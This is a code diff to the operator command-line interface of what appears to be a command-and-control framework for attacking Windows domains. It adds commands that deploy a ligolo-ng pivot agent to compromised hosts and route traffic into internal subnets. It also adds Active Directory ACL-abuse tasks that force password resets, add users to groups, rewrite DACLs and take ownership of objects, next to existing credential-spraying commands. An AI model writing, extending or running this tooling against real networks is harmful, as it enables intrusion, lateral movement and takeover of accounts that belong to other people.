@@ -9,6 +9,9 @@ Global mode:
   loot                        — list uploaded files per agent
   results <agent_id>          — show task results for an agent
   interact <agent_id>         — enter interactive mode for that agent
+  tunnels                     — list registered pivot tunnels
+  pivot status                — check if ligolo-ng proxy is running
+  pivot stop                  — stop the ligolo-ng proxy
   help                        — show this help
   exit / quit                 — exit the CLI
 
@@ -26,6 +29,16 @@ Interact mode  (prompt changes to [agent_id] >):
                                                    successful credentials are auto-stored to the DB.
   authenticate -u <user> -p <pass> --all         — try the credential against every known host in the DB.
   spray <target_ip>                              — try ALL stored credentials against target, show access matrix.
+  pivot -connect <ip:port> [-iface ligolo]       — start ligolo-ng proxy on server + deploy agent to target.
+                                                   place server/proxy and server/files/agent.exe before use.
+                                                   after the session appears in the proxy console, type 'start',
+                                                   then run: tunnel <subnet> [-iface ligolo]
+  tunnel <subnet> [-iface ligolo]                — register a pivot tunnel + add kernel route (after session start)
+  aclabuse addmember <group> <user>              — add user to a group (AddMember / GenericAll on group)
+  aclabuse forcechangepassword <user> <newpass>  — reset password without knowing current (ForceChangePassword)
+  aclabuse genericwrite <target> <attr> <value>  — write an AD attribute (GenericWrite / GenericAll on object)
+  aclabuse writedacl <target> <principal> <right>— grant an AD right to principal (WriteDacl on target)
+  aclabuse writeowner <target> <new_owner>       — take ownership of an AD object (WriteOwner on target)
   results                                        — show task results for this agent
   back                                           — return to global mode
 """
@@ -195,6 +208,48 @@ def _print_loot(data):
         print(f"  {agent_id}:")
         for f in files:
             print(f"    - {f}")
+
+
+def _print_tunnels(rows):
+    if not rows:
+        print("  (no tunnels)")
+        return
+    print(f"  {'ID':<6}  {'AGENT':<20}  {'SUBNET':<20}  {'IFACE':<12}  STATUS")
+    print("  " + "-" * 72)
+    for r in rows:
+        print(f"  {r['tunnel_id']:<6}  {r['agent_id']:<20}  {r['subnet']:<20}  {r['interface']:<12}  {r.get('status', 'active')}")
+
+
+# ── Pivot helpers ────────────────────────────────────────────────────────────
+
+def _parse_pivot_args(arg):
+    """Parse: -connect <ip:port> [-iface <name>]"""
+    tokens = arg.split()
+    connect = None
+    iface = "ligolo"
+    i = 0
+    while i < len(tokens):
+        if tokens[i] == "-connect" and i + 1 < len(tokens):
+            connect = tokens[i + 1]; i += 2
+        elif tokens[i] == "-iface" and i + 1 < len(tokens):
+            iface = tokens[i + 1]; i += 2
+        else:
+            i += 1
+    return connect, iface
+
+
+def _parse_tunnel_args(arg):
+    """Parse: <subnet> [-iface <name>]"""
+    tokens = arg.split()
+    subnet = None
+    iface = "ligolo"
+    i = 0
+    while i < len(tokens):
+        if tokens[i] == "-iface" and i + 1 < len(tokens):
+            iface = tokens[i + 1]; i += 2
+        else:
+            subnet = tokens[i]; i += 1
+    return subnet, iface
 
 
 # ── Authenticate helpers ──────────────────────────────────────────────────────
@@ -498,6 +553,28 @@ def handle_global(line):
             if rows is not None:
                 _print_results(rows)
 
+    elif cmd == "tunnels":
+        rows = _get("/pivot/tunnels")
+        if rows is not None:
+            _print_tunnels(rows)
+
+    elif cmd == "pivot":
+        sub = arg.strip().lower()
+        if sub == "status":
+            res = _get("/pivot/proxy/status")
+            if res is not None:
+                if res.get("running"):
+                    print(f"[+] Proxy running (PID {res.get('pid')})")
+                else:
+                    code = res.get("exit_code")
+                    print(f"[-] Proxy not running" + (f" (exit code {code})" if code is not None else ""))
+        elif sub == "stop":
+            res = _post("/pivot/proxy/stop", {})
+            if res is not None:
+                print("[+] Proxy stopped" if res.get("was_running") else "[*] Proxy was not running")
+        else:
+            print("usage: pivot status | pivot stop")
+
     elif cmd == "interact":
         if not arg:
             print("usage: interact <agent_id>")
@@ -624,6 +701,102 @@ def handle_interact(line, agent_id):
                         print(f"[-] No lateral movement ports found for {target} in recon data")
                     else:
                         _do_auth_sweep(agent_id, username, password, target, available)
+
+    elif cmd == "aclabuse":
+        _ACLABUSE_USAGE = {
+            "addmember":           ("group user",            2),
+            "forcechangepassword": ("user newpassword",      2),
+            "genericwrite":        ("target attribute value", 3),
+            "writedacl":           ("target principal right", 3),
+            "writeowner":          ("target new_owner",      2),
+        }
+        if not arg:
+            print("usage: aclabuse <op> <args>")
+            for op, (sig, _) in _ACLABUSE_USAGE.items():
+                print(f"  aclabuse {op} {sig}")
+        else:
+            try:
+                tokens = shlex.split(arg, posix=False)
+            except ValueError:
+                tokens = arg.split()
+            tokens = [t.strip("'\"") for t in tokens]
+
+            op = tokens[0].lower() if tokens else ""
+            op_args = tokens[1:]
+
+            if op not in _ACLABUSE_USAGE:
+                print(f"[-] Unknown operation '{op}'. Valid: {', '.join(_ACLABUSE_USAGE)}")
+            else:
+                _, required = _ACLABUSE_USAGE[op]
+                if len(op_args) < required:
+                    sig, _ = _ACLABUSE_USAGE[op]
+                    print(f"[-] {op} requires {required} argument(s): {sig}")
+                else:
+                    instruction = "|".join([op] + op_args)
+                    res = _post("/task", {
+                        "agent_id":    agent_id,
+                        "task_type":   "aclabuse",
+                        "instruction": instruction,
+                    })
+                    if res:
+                        print(f"[+] ACL abuse task queued — task_id: {res['task_id']}")
+                        _wait_for_result(agent_id, res["task_id"], timeout=60)
+
+    elif cmd == "pivot":
+        if not arg:
+            print("usage: pivot -connect <ip:port> [-iface ligolo]")
+        else:
+            connect, iface = _parse_pivot_args(arg)
+            if not connect:
+                print("[-] Missing -connect <ip:port>")
+            else:
+                port = 11601
+                if ":" in connect:
+                    try:
+                        port = int(connect.split(":")[-1])
+                    except ValueError:
+                        pass
+
+                print(f"[*] Starting ligolo-ng proxy on server (iface: {iface}, port: {port})...")
+                proxy_res = _post("/pivot/proxy/start", {"interface": iface, "port": port})
+                if not proxy_res:
+                    return True
+
+                if proxy_res.get("already_running"):
+                    print(f"[*] Proxy already running (PID {proxy_res.get('pid')})")
+                else:
+                    print(f"[+] Proxy started (PID {proxy_res.get('pid')}) — TUN: {iface}, port: {port}")
+
+                print(f"[*] Deploying ligolo-ng agent to {agent_id}...")
+                task_res = _post("/task", {
+                    "agent_id":    agent_id,
+                    "task_type":   "pivot",
+                    "instruction": connect,
+                })
+                if task_res:
+                    print(f"[+] Pivot task queued — task_id: {task_res['task_id']}")
+                    _wait_for_result(agent_id, task_res["task_id"], timeout=60)
+                    print()
+                    print("[*] Next steps:")
+                    print("     1. In the ligolo-ng proxy console: select session → type 'start'")
+                    print(f"    2. Run: tunnel <subnet> [-iface {iface}]")
+
+    elif cmd == "tunnel":
+        if not arg:
+            print("usage: tunnel <subnet> [-iface ligolo]  (e.g. tunnel 10.0.2.0/24)")
+        else:
+            subnet, iface = _parse_tunnel_args(arg)
+            if not subnet:
+                print("[-] Missing subnet (e.g. 10.0.2.0/24)")
+            else:
+                res = _post("/pivot/tunnel", {
+                    "agent_id":  agent_id,
+                    "subnet":    subnet,
+                    "interface": iface,
+                })
+                if res:
+                    print(f"[+] Tunnel registered — {subnet} via {iface} (tunnel_id: {res.get('tunnel_id')})")
+                    print(f"[*] Route added: {subnet} dev {iface}")
 
     elif cmd == "spray":
         if not arg:
